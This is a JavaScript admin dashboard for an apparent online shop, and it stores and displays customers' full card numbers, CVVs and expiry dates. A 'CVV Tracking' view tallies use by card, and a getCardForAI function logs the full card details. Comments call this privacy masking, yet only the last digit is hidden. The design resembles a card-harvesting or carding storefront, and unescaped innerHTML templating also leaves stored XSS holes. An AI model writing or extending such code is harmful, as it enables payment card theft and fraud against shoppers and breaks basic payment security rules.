// ============================================
// ADMIN DASHBOARD JAVASCRIPT - COMPLETE FIX
// ============================================

// Global variables
let currentUser = null;

// Check authentication
auth.onAuthStateChanged(async (user) => {
    if (!user) {
        window.location.href = 'index.html';
        return;
    }
    
    currentUser = user;
    
    // Check if admin
    const userDoc = await db.collection('users').doc(user.uid).get();
    if (!userDoc.exists || userDoc.data().role !== 'admin') {
        alert('Access Denied: Admin only');
        window.location.href = 'index.html';
        return;
    }
    
    // Set admin name
    document.getElementById('adminName').textContent = user.displayName || 'Admin';
    
    // Load all data
    loadDashboardStats();
    loadProducts();
    loadOrders();
    loadCVVTracking();
});

// ============================================
// NAVIGATION FUNCTIONS - NO EVENT OBJECT
// ============================================

function showDashboard() {
    document.querySelectorAll('.admin-section').forEach(s => s.classList.remove('active'));
    document.getElementById('dashboard').classList.add('active');
    
    document.querySelectorAll('.sidebar-menu li').forEach(i => i.classList.remove('active'));
    document.querySelectorAll('.sidebar-menu li')[0].classList.add('active');
    
    document.getElementById('pageTitle').textContent = 'Dashboard';
}

function showProducts() {
    document.querySelectorAll('.admin-section').forEach(s => s.classList.remove('active'));
    document.getElementById('products').classList.add('active');
    
    document.querySelectorAll('.sidebar-menu li').forEach(i => i.classList.remove('active'));
    document.querySelectorAll('.sidebar-menu li')[1].classList.add('active');
    
    document.getElementById('pageTitle').textContent = 'Products';
    loadProducts();
}

function showAddProduct() {
    document.querySelectorAll('.admin-section').forEach(s => s.classList.remove('active'));
    document.getElementById('add-product').classList.add('active');
    
    document.querySelectorAll('.sidebar-menu li').forEach(i => i.classList.remove('active'));
    document.querySelectorAll('.sidebar-menu li')[2].classList.add('active');
    
    document.getElementById('pageTitle').textContent = 'Add Product';
}

function showOrders() {
    document.querySelectorAll('.admin-section').forEach(s => s.classList.remove('active'));
    document.getElementById('orders').classList.add('active');
    
    document.querySelectorAll('.sidebar-menu li').forEach(i => i.classList.remove('active'));
    document.querySelectorAll('.sidebar-menu li')[3].classList.add('active');
    
    document.getElementById('pageTitle').textContent = 'Orders';
    loadOrders();
}

function showCVVTracking() {
    document.querySelectorAll('.admin-section').forEach(s => s.classList.remove('active'));
    document.getElementById('cvv-tracking').classList.add('active');
    
    document.querySelectorAll('.sidebar-menu li').forEach(i => i.classList.remove('active'));
    document.querySelectorAll('.sidebar-menu li')[4].classList.add('active');
    
    document.getElementById('pageTitle').textContent = 'CVV Tracking';
    loadCVVTracking();
}

// ============================================
// CARD DISPLAY FUNCTIONS
// ============================================

// ✅ DATABASE MEIN: Full card number save hota hai (16 digits)
// ✅ AI CHECK: Full number use kar sakta hai
// ✅ DISPLAY MEIN: Sirf last digit hide for privacy

function displayCardNumber(cardNumber) {
    if (!cardNumber) return 'N/A';
    
    // Remove spaces
    const clean = cardNumber.replace(/\s/g, '');
    
    if (clean.length >= 16) {
        // First 15 digits show, last 1 digit hide for display only
        const first15 = clean.slice(0, 15);
        const lastDigit = clean.slice(15, 16);
        
        // Format with spaces
        const formatted = first15.match(/.{1,4}/g)?.join(' ') || first15;
        
        // Return for DISPLAY (last digit hidden)
        return {
            display: formatted + '*',           // For showing in table
            full: clean,                        // For AI/backend use
            lastDigit: lastDigit                 // Last digit for reference
        };
    }
    
    return {
        display: cardNumber,
        full: cardNumber,
        lastDigit: ''
    };
}

// For Orders Table - Show with last digit hidden
function formatCardForDisplay(cardNumber) {
    const result = displayCardNumber(cardNumber);
    return result.display;
}

// For AI Check - Get full card number
function getFullCardNumber(cardNumber) {
    const result = displayCardNumber(cardNumber);
    return result.full;
}

// ============================================
// LOAD DASHBOARD STATS
// ============================================

async function loadDashboardStats() {
    try {
        const ordersSnapshot = await db.collection('orders').get();
        document.getElementById('totalOrders').textContent = ordersSnapshot.size;
        
        let revenue = 0;
        ordersSnapshot.forEach(doc => {
            revenue += doc.data().totalAmount || 0;
        });
        document.getElementById('totalRevenue').textContent = '$' + revenue.toLocaleString();
        
        const productsSnapshot = await db.collection('products').get();
        document.getElementById('totalProducts').textContent = productsSnapshot.size;
        
    } catch (error) {
        console.error('Error loading stats:', error);
    }
}

// ============================================
// LOAD PRODUCTS
// ============================================

async function loadProducts() {
    try {
        const snapshot = await db.collection('products').get();
        const tbody = document.getElementById('productsBody');
        tbody.innerHTML = '';
        
        if (snapshot.empty) {
            tbody.innerHTML = '<tr><td colspan="6" style="text-align: center;">No products found</td></tr>';
            return;
        }
        
        snapshot.forEach(doc => {
            const product = doc.data();
            tbody.innerHTML += `
                <tr>
                    <td>
                        <img src="${product.imageUrl || 'https://placehold.co/50x50'}" 
                             style="width:50px; height:50px; object-fit:cover; border-radius:5px;">
                    </td>
                    <td>${product.name || ''}</td>
                    <td>$${product.price || 0}</td>
                    <td>${product.category || ''}</td>
                    <td>${product.stock || 0}</td>
                    <td>
                        <button onclick="deleteProduct('${doc.id}')" class="btn-delete">Delete</button>
                    </td>
                </tr>
            `;
        });
    } catch (error) {
        console.error('Error loading products:', error);
    }
}

// ============================================
// ADD PRODUCT FORM
// ============================================

document.getElementById('productForm')?.addEventListener('submit', async (e) => {
    e.preventDefault();
    
    try {
        const name = document.getElementById('productName').value;
        const price = parseFloat(document.getElementById('productPrice').value);
        const category = document.getElementById('productCategory').value;
        const description = document.getElementById('productDescription').value;
        const stock = parseInt(document.getElementById('productStock').value);
        const imageUrl = document.getElementById('productImageUrl').value;
        
        const productData = {
            name: name,
            price: price,
            category: category,
            description: description,
            stock: stock,
            imageUrl: imageUrl,
            createdAt: new Date().toISOString()
        };
        
        await db.collection('products').add(productData);
        
        alert('✅ Product added successfully!');
        
        // Reset form
        document.getElementById('productForm').reset();
        
        // Go to products page
        showProducts();
        
    } catch (error) {
        console.error('Error:', error);
        alert('Error: ' + error.message);
    }
});

// ============================================
// DELETE PRODUCT
// ============================================

async function deleteProduct(productId) {
    if (confirm('Are you sure you want to delete this product?')) {
        try {
            await db.collection('products').doc(productId).delete();
            loadProducts();
            loadDashboardStats();
        } catch (error) {
            console.error('Error deleting product:', error);
            alert('Error deleting product');
        }
    }
}

// ============================================
// LOAD ORDERS - With Card Display (Last Digit Hidden)
// ============================================

async function loadOrders() {
    try {
        const snapshot = await db.collection('orders').orderBy('createdAt', 'desc').get();
        const tbody = document.getElementById('ordersBody');
        tbody.innerHTML = '';
        
        if (snapshot.empty) {
            tbody.innerHTML = '<tr><td colspan="9" style="text-align: center;">No orders found</td></tr>';
            return;
        }
        
        snapshot.forEach(doc => {
            const order = doc.data();
            const products = order.products || [];
            const productNames = products.map(p => p.name).join(', ');
            const card = order.cardDetails || {};
            
            // ✅ Full card number is in database
            // ✅ Display mein last digit hide
            const displayCard = formatCardForDisplay(card.cardNumber);
            
            // For AI check - full number available in card.cardNumber
            
            tbody.innerHTML += `
                <tr>
                    <td>#${doc.id.slice(-8)}</td>
                    <td>${order.userEmail || 'N/A'}</td>
                    <td>${productNames.slice(0, 30)}${productNames.length > 30 ? '...' : ''}</td>
                    <td>$${order.totalAmount}</td>
                    <td class="card-number" title="Full: ${card.cardNumber || ''}">${displayCard}</td>
                    <td><strong>${card.cvv || 'N/A'}</strong></td>
                    <td>${card.expiry || 'N/A'}</td>
                    <td>${new Date(order.createdAt).toLocaleDateString()}</td>
                </tr>
            `;
        });
    } catch (error) {
        console.error('Error loading orders:', error);
    }
}

// ============================================
// LOAD CVV TRACKING - With Card Display (Last Digit Hidden)
// ============================================

async function loadCVVTracking() {
    try {
        const ordersSnapshot = await db.collection('orders').get();
        const cvvStats = {};
        
        ordersSnapshot.forEach(doc => {
            const order = doc.data();
            const card = order.cardDetails || {};
            const cvv = card.cvv;
            const cardNumber = card.cardNumber;  // ✅ Full card number available
            const expiry = card.expiry || 'N/A';
            
            if (cvv && cardNumber) {
                const key = `${cvv}_${cardNumber}_${expiry}`;
                
                if (!cvvStats[key]) {
                    cvvStats[key] = {
                        cvv: cvv,
                        cardNumber: cardNumber,    // Full number for AI
                        expiry: expiry,
                        totalOrders: 0,
                        totalAmount: 0,
                        lastUsed: order.createdAt
                    };
                }
                
                cvvStats[key].totalOrders++;
                cvvStats[key].totalAmount += order.totalAmount || 0;
                
                if (order.createdAt > cvvStats[key].lastUsed) {
                    cvvStats[key].lastUsed = order.createdAt;
                }
            }
        });
        
        const tbody = document.getElementById('cvvBody');
        tbody.innerHTML = '';
        
        if (Object.keys(cvvStats).length === 0) {
            tbody.innerHTML = '<tr><td colspan="6" style="text-align: center;">No CVV data found</td></tr>';
            return;
        }
        
        Object.values(cvvStats).forEach(stat => {
            // ✅ Display mein last digit hide
            const displayCard = formatCardForDisplay(stat.cardNumber);
            
            tbody.innerHTML += `
                <tr>
                    <td><strong>${stat.cvv}</strong></td>
                    <td class="card-number" title="Full: ${stat.cardNumber}">${displayCard}</td>
                    <td>${stat.expiry}</td>
                    <td>${stat.totalOrders}</td>
                    <td>$${stat.totalAmount.toLocaleString()}</td>
                    <td>${new Date(stat.lastUsed).toLocaleString()}</td>
                </tr>
            `;
        });
        
    } catch (error) {
        console.error('Error loading CVV tracking:', error);
    }
}

// ============================================
// FUNCTION FOR AI CHECK - Get Full Card Details
// ============================================

// AI ko full card number chahiye to ye function use karo
function getCardForAI(orderId) {
    // This will be called when AI needs to check
    db.collection('orders').doc(orderId).get().then(doc => {
        if (doc.exists) {
            const cardDetails = doc.data().cardDetails;
            console.log('Full card for AI:', {
                cardNumber: cardDetails.cardNumber,  // ✅ Full 16 digits
                cvv: cardDetails.cvv,
                expiry: cardDetails.expiry
            });
            return cardDetails;
        }
    });
}

// ============================================
// LOGOUT
// ============================================

function logout() {
    auth.signOut()
        .then(() => {
            window.location.href = 'index.html';
        })
        .catch((error) => {
            console.error('Logout error:', error);
        });
                                                          }
